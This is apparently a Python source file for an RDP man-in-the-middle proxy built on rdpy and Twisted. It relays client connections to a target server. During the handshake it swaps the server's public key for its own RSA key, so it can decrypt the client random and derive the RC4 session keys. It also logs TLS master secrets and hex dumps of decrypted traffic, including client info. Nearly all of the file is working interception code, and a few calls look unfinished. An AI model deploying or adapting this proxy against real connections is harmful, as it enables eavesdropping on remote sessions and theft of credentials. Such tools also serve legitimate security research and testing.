import Crypto.Random
import logging
from Crypto.PublicKey import RSA
from enum import IntEnum

from twisted.internet import reactor
from twisted.internet.protocol import ServerFactory, ClientFactory

from rdpy.core import log
from rdpy.core.crypto import RC4Crypter
from rdpy.core.newlayer import Layer, LayerObserver
from rdpy.enum.rdp import NegotiationProtocols, RDPSecurityHeaderType, EncryptionMethod, ServerCertificateType, \
    RDPDataPDUSubtype, RDPDataPDUType
from rdpy.layer.gcc import GCCClientConnectionLayer
from rdpy.layer.mcs import MCSLayer, MCSClientConnectionLayer
from rdpy.layer.rdp.connection import RDPClientConnectionLayer
from rdpy.layer.rdp.data import RDPDataLayer, RDPDataLayerObserver
from rdpy.layer.rdp.licensing import RDPLicensingLayer
from rdpy.layer.rdp.security import RDPSecurityLayer
from rdpy.layer.tcp import TCPLayer
from rdpy.layer.tpkt import TPKTLayer
from rdpy.layer.x224 import X224Layer
from rdpy.parser.gcc import GCCParser
from rdpy.parser.rdp import RDPClientInfoParser, RDPClientConnectionParser, RDPServerConnectionParser, \
    RDPNegotiationParser, RDPDataParser
from rdpy.pdu.gcc import GCCConferenceCreateResponsePDU
from rdpy.pdu.mcs import MCSConnectResponsePDU, MCSAttachUserConfirmPDU, MCSChannelJoinConfirmPDU
from rdpy.pdu.rdp.connection import ServerSecurityData, RDPServerDataPDU, \
    RDPNegotiationResponsePDU, ProprietaryCertificate
from rdpy.pdu.rdp.data import RDPConfirmActivePDU, RDPShareControlHeader, RDPSynchronizePDU
from rdpy.pdu.rdp.security import RDPSecurityExchangePDU
from rdpy.protocol.mcs.channel import MCSChannelFactory, MCSServerChannel, MCSClientChannel
from rdpy.protocol.mcs.client import MCSClientRouter
from rdpy.protocol.mcs.server import MCSServerRouter
from rdpy.protocol.mcs.user import MCSUserObserver, MCSUser
from rdpy.protocol.rdp.x224 import ServerTLSContext


class SecuritySettings:
    class Mode(IntEnum):
        CLIENT = 0
        SERVER = 1

    def __init__(self, mode):
        """
        :type mode: SecuritySettings.Mode
        """
        self.mode = mode
        self.encryptionMethod = None
        self.clientRandom = None
        self.serverRandom = None
        self.publicKey = None
        self.crypter = None

    def generateCrypter(self):
        if self.mode == SecuritySettings.Mode.CLIENT:
            self.crypter = RC4Crypter.generateClient(self.clientRandom, self.serverRandom, self.encryptionMethod)
        else:
            self.crypter = RC4Crypter.generateServer(self.clientRandom, self.serverRandom, self.encryptionMethod)

    def generateClientRandom(self):
        self.clientRandom = Crypto.Random.get_random_bytes(32)

        if self.serverRandom is not None:
            self.generateCrypter()

    def encryptClientRandom(self):
        # Client random is stored as little-endian but crypto functions expect it to be in big-endian format.
        return self.publicKey.encrypt(self.clientRandom[:: -1], 0)[0][:: -1]

    def serverSecurityReceived(self, security):
        self.encryptionMethod = security.encryptionMethod
        self.serverRandom = security.serverRandom
        self.publicKey = security.serverCertificate.publicKey

        if self.clientRandom is not None:
            self.generateCrypter()

    def setServerRandom(self, random):
        self.serverRandom = random

        if self.clientRandom is not None:
            self.generateCrypter()

    def setClientRandom(self, random):
        self.clientRandom = random

        if self.serverRandom is not None:
            self.generateCrypter()

    def getCrypter(self):
        if self.crypter is None:
            raise Exception("The crypter was not generated. The crypter will be generated when the server random is received.")

        return self.crypter






class MITMChannelObserver(RDPDataLayerObserver):
    def __init__(self, layer, name = ""):
        RDPDataLayerObserver.__init__(self)
        self.layer = layer
        self.name = name
        self.peer = None
        self.setUnparsedDataHandler(self.onDataReceived)

    def setPeer(self, peer):
        self.peer = peer

    def onPDUReceived(self, pdu):
        if hasattr(pdu.header, "subtype"):
            log.debug("%s: received %s" % (self.name, str(pdu.header.subtype)))
            if pdu.header.subtype == RDPDataPDUSubtype.PDUTYPE2_SYNCHRONIZE:
                self.sync = pdu

            if hasattr(pdu, "errorInfo"):
                log.debug("%s" % pdu.errorInfo)
        else:
            log.debug("%s: received %s" % (self.name, str(pdu.header.type)))

        RDPDataLayerObserver.onPDUReceived(self, pdu)
        self.peer.sendPDU(pdu)

    def onDataReceived(self, data):
        log.debug("%s: received data" % self.name)
        self.peer.sendData(data)

    def sendPDU(self, pdu):
        if hasattr(pdu.header, "subtype"):
            log.debug("%s: sending %s" % (self.name, str(pdu.header.subtype)))

            if hasattr(pdu, "errorInfo"):
                log.debug("%s" % pdu.errorInfo)
        else:
            log.debug("%s: sending %s" % (self.name, str(pdu.header.type)))

        self.layer.sendPDU(pdu)

    def sendData(self, data):
        log.debug("%s: sending data, %s" % (self.name, data.encode('hex')))
        self.layer.sendData(data)





class MITMClient(MCSChannelFactory):
    def __init__(self, server):
        MCSChannelFactory.__init__(self)
        self.server = server

        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()
        self.router = MCSClientRouter(self.mcs, self)
        self.channelMap = {}
        self.channelDefinitions = []
        self.channelObservers = {}
        self.user = None
        self.security = SecuritySettings(SecuritySettings.Mode.CLIENT)
        self.conferenceCreateResponse = None
        self.serverData = None

        self.mcsConnect = MCSClientConnectionLayer(self.mcs)
        self.gccConnect = GCCClientConnectionLayer("1")
        self.rdpConnect = RDPClientConnectionLayer()

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.mcsConnect.setNext(self.gccConnect)
        self.gccConnect.setNext(self.rdpConnect)

        self.mcs.setObserver(self.router)

        self.tcp.createObserver(onConnection=self.startConnection)
        self.x224.createObserver(onConnectionConfirm=self.onConnectionConfirm)
        self.router.createObserver(onConnectResponse=self.onConnectResponse)
        self.gccConnect.createObserver(onPDUReceived=self.onConferenceCreateResponse)
        self.rdpConnect.createObserver(onPDUReceived=self.onServerData)

    def getProtocol(self):
        return self.tcp

    def startConnection(self):
        """
        Start the connection sequence to the target machine.
        """
        log.debug("Client TCP connected")
        negotiation = self.server.getNegotiationPDU()
        parser = RDPNegotiationParser()
        self.x224.sendConnectionRequest(parser.write(negotiation))

    def onConnectionConfirm(self, pdu):
        """
        Called when the X224 layer is connected.
        """
        log.debug("Connection Confirm received")
        self.server.onConnectionConfirm(pdu)

    def onConnectInitial(self, gccConferenceCreateRequest, clientData):
        """
        Called when a Connect Initial PDU is received.
        :param gccConferenceCreateRequest: the conference create request.
        :param clientData: the RDPClientDataPDU.
        """
        if clientData.networkData:
            self.channelDefinitions = clientData.networkData.channelDefinitions

        self.gccConnect.conferenceName = gccConferenceCreateRequest.conferenceName
        self.rdpConnect.send(clientData)

    def onConnectResponse(self, pdu):
        """
        Called when an MCS Connect Response PDU is received.
        """
        if pdu.result != 0:
            log.error("Connection Failed")
            self.server.onConnectResponse(self, pdu, None)
        else:
            log.debug("Connection Successful")
            self.mcsConnect.recv(pdu)
            self.server.onConnectResponse(pdu, self.serverData)

    def onConferenceCreateResponse(self, pdu):
        self.conferenceCreateResponse = pdu

    def onServerData(self, serverData):
        """
        Called when the server data from the GCC Conference Create Response is received.
        """
        self.serverData = serverData
        self.security.serverSecurityReceived(serverData.security)
        self.security.generateClientRandom()

        self.channelMap[self.serverData.network.mcsChannelID] = "I/O"

        for index in range(len(serverData.network.channels)):
            channelID = serverData.network.channels[index]
            self.channelMap[channelID] = self.channelDefinitions[index].name

    def onAttachUserRequest(self):
        self.user = self.router.createUser()
        self.user.setObserver(self)
        self.user.attach()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.server.onAttachConfirmed(user)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user):
        self.server.onAttachRefused(user)

    def onChannelJoinRequest(self, pdu):
        self.mcs.send(pdu)

    def buildChannel(self, mcs, userID, channelID):
        log.debug("Client: building channel {} for user {}".format(channelID, userID))

        if self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_NONE:
            headerType = RDPSecurityHeaderType.NONE
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_FIPS:
            headerType = RDPSecurityHeaderType.FIPS
        else:
            headerType = RDPSecurityHeaderType.SIGNED

        if channelID != userID and self.channelMap[channelID] == "I/O":
            self.io = RDPDataLayer()
            security = RDPSecurityLayer(headerType, self.security.getCrypter())
            channel = MCSClientChannel(mcs, userID, channelID)

            channel.setNext(security)
            security.setNext(self.io)

            observer = MITMChannelObserver(self.io, "Client")
            self.channelObservers[channelID] = observer

            self.io.setObserver(observer)
            security.licensing.createObserver(onPDUReceived=self.onLicensingPDU)

            self.io.previous.sendSecurityExchange(self.security.encryptClientRandom())
        else:
            channel = None

        self.server.onChannelJoinConfirm(userID, channelID)
        return channel

    def onClientInfoReceived(self, pdu):
        self.io.previous.sendClientInfo(pdu)

    def onLicensingPDU(self, pdu):
        log.debug("Licensing PDU received")
        self.server.onLicensingPDU(pdu)

    def getChannelObserver(self, channelID):
        return self.channelObservers[channelID]



class MITMServerRouter(MCSServerRouter):
    def __init__(self, server, mcs, factory):
        MCSServerRouter.__init__(self, mcs, factory, None)
        self.server = server

    def onAttachUserRequest(self, pdu):
        self.server.onAttachUserRequest(pdu)

    def attachSuccessful(self, userID):
        user = MCSUser(self, self.factory)
        user.onAttachConfirmed(userID)
        self.users[userID] = user
        self.mcs.send(MCSAttachUserConfirmPDU(0, userID))

    def attachFailed(self):
        self.mcs.send(MCSAttachUserConfirmPDU(1, 0))

    def onChannelJoinRequest(self, pdu):
        self.server.onChannelJoinRequest(pdu)

    def channelJoinAccepted(self, userID, channelID):
        self.users[userID].channelJoined(self.mcs, channelID)
        self.mcs.send(MCSChannelJoinConfirmPDU(0, userID, channelID, channelID, ""))





class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
    def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName):
        MCSUserObserver.__init__(self)
        self.targetHost = targetHost
        self.targetPort = targetPort
        self.client = None
        self.negotiationPDU = None
        self.serverData = None
        self.licensing = None
        self.io = None
        self.securityLayer = None
        self.rc4RSAKey = RSA.generate(2048)
        self.settings = SecuritySettings(SecuritySettings.Mode.SERVER)

        self.use_tls = False
        self.tcp = TCPLayer()
        self.tpkt = TPKTLayer()
        self.x224 = X224Layer()
        self.mcs = MCSLayer()

        self.tcp.setNext(self.tpkt)
        self.tpkt.setNext(self.x224)
        self.x224.setNext(self.mcs)

        self.tcp.createObserver(onConnection=self.onConnection)
        self.x224.createObserver(onConnectionRequest=self.onConnectionRequest)

        self.router = MITMServerRouter(self, self.mcs, self)
        self.router.createObserver(onConnectionReceived = self.onConnectInitial)
        self.mcs.setObserver(self.router)

        # self.io = IOChannel()
        self.ioSecurityLayer = None
        self.licensingLayer = RDPLicensingLayer()
        self.certificateFileName = certificateFileName
        self.privateKeyFileName = privateKeyFileName
        self.gcc = GCCParser()
        self.rdpClientInfoParser = RDPClientInfoParser()
        self.rdpClientConnectionParser = RDPClientConnectionParser()
        self.rdpServerConnectionParser = RDPServerConnectionParser()
        self.rdpNegotiationParser = RDPNegotiationParser()

    def getProtocol(self):
        return self.tcp

    def getNegotiationPDU(self):
        return self.negotiationPDU

    # Build protocol for the client side of the connection
    def buildProtocol(self, addr):
        self.client = MITMClient(self)
        return self.client.getProtocol()

    def logSSLParameters(self):
        log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                  self.tpkt.previous.transport.protocol._tlsConnection.master_key())

    # Connect the client side to the target machine
    def connectClient(self):
        reactor.connectTCP(self.targetHost, self.targetPort, self)

    # Connection sequence #0
    def onConnection(self):
        log.debug("Server TCP connected")

    # X224 Request
    def onConnectionRequest(self, pdu):
        log.debug("Connection Request received")
        self.negotiationPDU = self.rdpNegotiationParser.parse(pdu.payload)
        self.connectClient()

    # X224 Response
    def onConnectionConfirm(self, pdu):
        protocols = NegotiationProtocols.SSL if self.negotiationPDU.tlsSupported else NegotiationProtocols.NONE
        payload = self.rdpNegotiationParser.write(RDPNegotiationResponsePDU(0x00, protocols))
        self.x224.sendConnectionConfirm(payload, source = 0x1234)

        if self.negotiationPDU.tlsSupported:
            self.tpkt.startTLS(ServerTLSContext(privateKeyFileName=self.privateKeyFileName, certificateFileName=self.certificateFileName))
            self.use_tls = True

    # MCS Connect Initial
    def onConnectInitial(self, pdu):
        """
        Parse the ClientData PDU and send a ServerData PDU back.
        :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
        """
        log.debug("Connect Initial received")

        if self.use_tls:
            self.logSSLParameters()

        gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)
        rdpClientDataPdu = self.rdpClientConnectionParser.parse(gccConferenceCreateRequestPDU.payload)
        self.client.onConnectInitial(gccConferenceCreateRequestPDU, rdpClientDataPdu)
        return True

    # MCS Connect Response
    def onConnectResponse(self, pdu, serverData):
        """
        :type pdu: MCSConnectResponsePDU
        :type serverData: RDPServerDataPDU
        """
        # Replace the server's public key with our own key so we can decrypt the incoming client random
        cert = serverData.security.serverCertificate
        cert = ProprietaryCertificate(
            cert.signatureAlgorithmID,
            cert.keyAlgorithmID,
            cert.publicKeyType,
            self.rc4RSAKey,
            cert.signatureType,
            cert.signature,
            cert.padding
        )

        security = ServerSecurityData(
            serverData.security.encryptionMethod,
            serverData.security.encryptionLevel,
            serverData.security.serverRandom,
            cert
        )
        self.settings.serverSecurityReceived(security)
        self.serverData = RDPServerDataPDU(serverData.core, security, serverData.network)

        rdpParser = RDPServerConnectionParser()
        gccParser = GCCParser()

        gcc = self.client.conferenceCreateResponse
        gcc = GCCConferenceCreateResponsePDU(gcc.nodeID, gcc.tag, gcc.result, rdpParser.write(self.serverData))
        pdu = MCSConnectResponsePDU(pdu.result, pdu.calledConnectID, pdu.domainParams, gccParser.write(gcc))
        self.mcs.send(pdu)

    # MCS Attach User Request
    def onAttachUserRequest(self, pdu):
        self.client.onAttachUserRequest()

    # MCS Attach User Confirm successful
    def onAttachConfirmed(self, user):
        self.router.attachSuccessful(user.userID)

    # MCS Attach User Confirm failed
    def onAttachRefused(self, user):
        self.router.attachFailed()

    # MCS Channel Join Request
    def onChannelJoinRequest(self, pdu):
        self.client.onChannelJoinRequest(pdu)

    # MCS Channel Join Confirm
    def onChannelJoinConfirm(self, userID, channelID):
        self.router.channelJoinAccepted(userID, channelID)


    def buildChannel(self, mcs, userID, channelID):
        log.debug("Server: building channel {} for user {}".format(channelID, userID))

        if self.use_tls:
            headerType = RDPSecurityHeaderType.BASIC
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_NONE:
            headerType = RDPSecurityHeaderType.NONE
        elif self.serverData.security.encryptionMethod == EncryptionMethod.ENCRYPTION_FIPS:
            headerType = RDPSecurityHeaderType.FIPS
        else:
            headerType = RDPSecurityHeaderType.SIGNED

        if channelID == self.serverData.network.mcsChannelID:
            self.io = RDPDataLayer()
            self.securityLayer = RDPSecurityLayer(headerType, None)
            self.licensing = self.securityLayer.licensing
            channel = MCSServerChannel(mcs, userID, channelID)

            channel.setNext(self.securityLayer)
            self.securityLayer.setNext(self.io)

            self.securityLayer.createObserver(
                onClientInfoReceived = self.onClientInfoReceived,
                onSecurityExchangeReceived = self.onSecurityExchangeReceived
            )

            observer = MITMChannelObserver(self.io, "Server")
            clientObserver = self.client.getChannelObserver(channelID)

            observer.setPeer(clientObserver)
            clientObserver.setPeer(observer)

            self.io.setObserver(observer)

            return channel

    # Security Exchange
    def onSecurityExchangeReceived(self, pdu):
        """
        :type pdu: RDPSecurityExchangePDU
        :return:
        """
        log.debug("Server: Security Exchange received")
        clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
        self.settings.setClientRandom(clientRandom)
        self.securityLayer.crypter = self.settings.getCrypter()

    # Client Info Packet
    def onClientInfoReceived(self, pdu):
        log.debug("Server: Client Info received")
        self.client.onClientInfoReceived(pdu)

    def onLicensingPDU(self, pdu):
        self.licensing.sendPDU(pdu)






class RDPClientFactory(ClientFactory):
    def buildProtocol(self, addr):
        client = MITMClient()
        return client.getProtocol()






class RDPServerFactory(ServerFactory):
    def __init__(self, targetIP, privateKeyFileName, certificateFileName):
        self._privateKeyFileName = privateKeyFileName
        self._certificateFileName = certificateFileName

    def buildProtocol(self, addr):
        server = MITMServer("127.0.0.2", 3390, self._certificateFileName, self._privateKeyFileName)
        return server.getProtocol()





log.get_logger().setLevel(logging.DEBUG)
reactor.listenTCP(3388, RDPServerFactory("127.0.0.1", None, None))
reactor.run()